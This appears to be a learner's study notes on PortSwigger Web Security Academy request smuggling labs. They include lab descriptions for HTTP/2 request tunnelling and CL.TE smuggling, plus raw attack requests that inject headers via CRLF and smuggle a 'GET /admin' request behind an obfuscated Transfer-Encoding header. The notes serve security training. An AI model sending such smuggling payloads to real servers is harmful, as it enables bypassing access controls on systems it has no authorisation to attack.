The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.
#### Note
This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override)
Tip:
>To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the `Shift + Return` keys. Note that this feature is not available when you double-click on the header.
---
GET /  HTTP/1.1
Host:  accf1f361e00dc5fc008caa50018008a.web-security-academy.net
Foo: bar^~Host: accf1f361e00dc5fc008caa50018008a.web-security-academy.net  ^~^ GET /robots.txt HTTP/1.1*~Foo: bar
:method  GET
: path/
:authority  accf1f361e00dc5fc008caa50018008a.web-security-academy.net
foo bar  
      Host: accf1f361e00dc5fc008caa50018008a.web-security-academy.net
  
      GET /robots.txt HTTP/1.1  
      X-Ignore: x
then use the custom python intruder
---
 ### Bypassing access controls via HTTP/2 request tunnelling
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at `/admin` as the `administrator` user and delete `carlos`.
The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling).
The front-end server appends a series of [client authentication headers](https://portswigger.net/web-security/request-smuggling/exploiting#bypassing-client-authentication) to incoming requests. 
You need to find a way of leaking these.
-----------------------
# Prep for presentation:
Testing for CL.TE :  the front end server checks Content-Length
The backend server prioritizes the Transfer-Encoding header : Chuncked 
and ignores the Content-Length
![[REQUEST_SMUGGLING_BREAKDOWN_BLACKBOARD.png]]
![](file:///home/linux/Pictures/HTTP_REQ_SMUGGLING_Whiteboard.png)
## Same concept then when requesting an admin endpoint
1st request
```
POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked

3
x=y
0
```
```
GET /admin HTTP/1.1
X-Ignore: X
```
And this is the 2nd request that was "smuggled" in

